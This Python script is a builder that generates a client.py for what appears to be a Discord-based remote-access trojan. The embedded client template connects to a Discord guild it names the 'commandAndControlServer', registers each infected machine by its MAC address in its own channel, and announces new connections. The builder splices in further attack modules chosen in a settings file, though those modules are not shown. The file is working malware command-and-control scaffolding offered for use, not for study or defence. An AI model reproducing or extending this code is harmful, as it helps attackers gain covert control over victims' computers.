import json
import os
import sys
import importlib.util
from datetime import datetime

def get_current_date_str():
    """Return the current date as a string formatted YYYY_MM_DD."""
    return datetime.now().strftime("%Y_%m_%d")

def create_output_directory(date_str):
    """Ensure the OUTPUT directory for the given date exists and return its path."""
    output_dir = os.path.join(os.path.dirname(__file__), 'OUTPUT', date_str)
    os.makedirs(output_dir, exist_ok=True)
    return output_dir

def get_client_script_path(output_dir):
    """Return the full path to the client.py file in the output directory."""
    return os.path.join(output_dir, 'client.py')

def get_settings_file_path():
    """Return the full path to the settings.json file."""
    return os.path.join(os.path.dirname(__file__), '..', '..', 'settings', 'settings.json')

def verify_file_exists(file_path, error_message):
    """Exit the program if the specified file does not exist."""
    if not os.path.exists(file_path):
        print(error_message)
        sys.exit(1)

def load_settings(settings_path):
    """Load and return settings from the JSON file."""
    print(f"[?] Reading settings from {settings_path}")
    try:
        with open(settings_path, "r") as file:
            settings = json.load(file)
    except json.JSONDecodeError as error:
        print(f"[-] Error parsing JSON: {error}")
        sys.exit(1)
    print(f"[+] Reading settings from {settings_path} successfully")
    return settings

def get_initial_client_script():
    """Return the initial part of the client.py script."""
    return """
import os
import discord
import sys
from settings import guildid, bottoken
from uuid import getnode

intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)
global mac_address
mac_address = str(getnode())

async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None

@client.event
async def on_ready():
    commandAndControlServer = client.get_guild(int(guildid))
    channel = await find_channel_by_name(commandAndControlServer, mac_address)
    if channel:
        await channel.send("Connection reestablished")
    else:
        channel = await commandAndControlServer.create_text_channel(mac_address)
        e = await channel.send("New Connection established")
        await e.pin()
        await channel.send("hello world")

@client.event
async def on_message(message):
    if message.author == client.user:
        return
"""

def load_module_code(module_name, module_file_path):
    """Load and return the code snippet from a module if available."""
    try:
        spec = importlib.util.spec_from_file_location(module_name, module_file_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        if hasattr(module, "get_code"):
            print(f"[+] Adding code from {module_name}")
            return module.get_code()
        else:
            print(f"[-] Module {module_name} does not have a get_code function")
    except Exception as error:
        print(f"[-] Error loading {module_name} from {module_file_path}: {error}")
    return ""

def process_modules(modules_config, components_dir):
    """Iterate through each module in settings and append its code if enabled."""
    combined_code = ""
    for module_name, is_enabled in modules_config.items():
        if not is_enabled:
            print(f"[?] Module {module_name} is disabled in settings; skipping.")
            continue

        module_file_name = f"{module_name.lower()}.py"
        module_file_path = os.path.join(components_dir, module_file_name)
        if not os.path.exists(module_file_path):
            print(f"[-] Module {module_name} is enabled in settings but file not found at {module_file_path}")
            continue

        combined_code += load_module_code(module_name, module_file_path)
    return combined_code

def finalize_client_script(existing_script):
    """Append the final part of the client.py script."""
    additional_code = """
# Add more commands and functionality as needed...

client.run(bottoken)
"""
    return existing_script + additional_code

def write_client_script(file_path, content):
    """Write the generated client script to a file."""
    with open(file_path, "w") as file:
        file.write(content)
    print("[+] Writing client.py successful")
    print(f"[+] client.py has been generated at {file_path}")

def main():
    # Set up paths and directories
    current_date_str = get_current_date_str()
    output_dir = create_output_directory(current_date_str)
    client_script_path = get_client_script_path(output_dir)
    settings_path = get_settings_file_path()

    print(f"[?] Settings path: {settings_path}")
    print(f"[?] Client path: {client_script_path}")

    verify_file_exists(settings_path, f"[-] Settings file not found at {settings_path}")

    # Load settings from file
    settings = load_settings(settings_path)

    # Start building the client.py content
    client_script_content = get_initial_client_script()

    # Process additional component modules
    components_dir = os.path.join(os.path.dirname(__file__), 'components')
    print(f"[?] Searching for components in {components_dir}")
    modules_config = settings.get("Modules", {})
    client_script_content += process_modules(modules_config, components_dir)

    print("[.] Building client.py")
    client_script_content = finalize_client_script(client_script_content)
    print("[+] Building client.py successful")

    # Write the generated client script to file
    write_client_script(client_script_path, client_script_content)

if __name__ == "__main__":
    main()
